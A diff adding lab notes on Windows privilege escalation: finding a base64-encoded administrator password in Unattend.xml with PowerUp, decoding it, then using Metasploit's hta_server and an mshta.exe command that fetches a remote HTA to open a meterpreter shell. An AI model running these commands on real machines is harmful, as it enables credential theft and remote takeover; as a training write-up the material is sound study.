@@ -251,3 +251,42 @@ NTLM is a collection of authentication protocols that are utilized in Windows to
 - Case sensitive.
 - Allows the use of symbols and unicode characters.
 
+
+### Searching for passwords in Windwos configuration files
+
+Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems. This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems. The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
+- C:\Windows\Panther\Unattend.xml
+- C:\Windows\Panther\Autounattend.xml
+As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.
+
+### Practical Unattended Installation
+
+**Get access on the machine**
+
+We are running as a student user. The PowerSploit framework and Powerup.ps1 scripts are provided.
+
+- `cd .\Desktop\PowerSploit\Privesc\`
+- `ls` We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability.
+- `powershell -ep bypass`
+- `. .\PowerUp.ps1` Import PowerUp.ps1 script and Invoke-PrivescAudit function.
+- `Invoke-PrivescAudit`
+- `cat C:\Windows\Panther\Unattend.xml` We have discovered an administrator encoded password.
+
+![image](https://github.com/user-attachments/assets/8d74251c-ee10-40f9-84cb-ebe78b848b33)
+
+- `$password='QWRtaW5AMTIz'` set value
+- `$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))` Decoding password with powershell
+- `echo $password`
+
+![image](https://github.com/user-attachments/assets/c4f75439-f12a-4a5c-9d4e-b2f2cf4fbcba)
+
+- Open CMD as administrator with the admin PW
+- `msfconsole -q` Back on the Kali machine
+- `use exploit/windows/misc/hta_server` Running hta_server module to gain meterpreter shell
+- `exploit`
+- `mshta.exe http://10.10.41.5:8080/ZoRtmIOiuG7WIBS.hta` Gaining a meterpreter shell on the target machine
+- `sessions -i 1` find flag
+- `cd /`
+- `cd C:\\Users\\Administrator\\Desktop`
+- `dir`
+- `cat flag.txt`
